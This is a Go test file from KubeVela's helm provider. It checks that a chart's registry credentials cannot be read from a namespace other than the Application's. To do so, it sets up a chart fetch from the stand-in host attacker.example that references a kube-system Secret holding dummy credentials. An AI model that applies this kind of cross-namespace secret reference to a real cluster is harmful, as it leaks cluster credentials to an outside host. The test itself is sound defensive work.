/*
Copyright 2026 The KubeVela Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

	http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package helm

import (
	"context"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"

	"github.com/kubevela/pkg/cue/cuex/providers"
	"github.com/kubevela/pkg/util/singleton"
)

// The release namespace is the author's to choose, so it is no grant to read Secrets in it: a
// chart's credentials come from the Application's namespace whatever release.namespace says.
var _ = Describe("A release in another namespace", func() {
	It("does not let the chart's credentials be read from there", func() {
		scheme := runtime.NewScheme()
		Expect(corev1.AddToScheme(scheme)).To(Succeed())
		origKube := singleton.KubeClient.Get()
		defer singleton.KubeClient.Set(origKube)
		singleton.KubeClient.Set(fake.NewClientBuilder().WithScheme(scheme).WithObjects(&corev1.Secret{
			ObjectMeta: metav1.ObjectMeta{Name: "registry-creds", Namespace: "kube-system"},
			Type:       corev1.SecretTypeBasicAuth,
			Data:       map[string][]byte{"username": []byte("admin"), "password": []byte("hunter2")},
		}).Build())

		_, err := Render(WithDryRun(context.Background()), &providers.Params[RenderParams]{Params: RenderParams{
			Chart: ChartSourceParams{Source: "https://attacker.example/c-1.0.0.tgz",
				Auth: &AuthParams{SecretRef: &SecretRefParams{Name: "registry-creds", Namespace: "kube-system"}}},
			Release: &ReleaseParams{Name: "rel", Namespace: "kube-system"},
			Context: &ContextParams{AppName: "shop", AppNamespace: "team-a", Name: "web", Namespace: "team-a"},
		}})
		Expect(err).To(MatchError(ContainSubstring(`MUST be in the Application namespace "team-a"`)))
	})

	It("does not read them from there when the Application's namespace is unknown", func() {
		_, err := Render(WithDryRun(context.Background()), &providers.Params[RenderParams]{Params: RenderParams{
			Chart: ChartSourceParams{Source: "https://attacker.example/c-1.0.0.tgz",
				Auth: &AuthParams{SecretRef: &SecretRefParams{Name: "registry-creds"}}},
			Release: &ReleaseParams{Name: "rel", Namespace: "kube-system"},
		}})
		Expect(err).To(MatchError(ContainSubstring("no Application namespace")))
	})
})
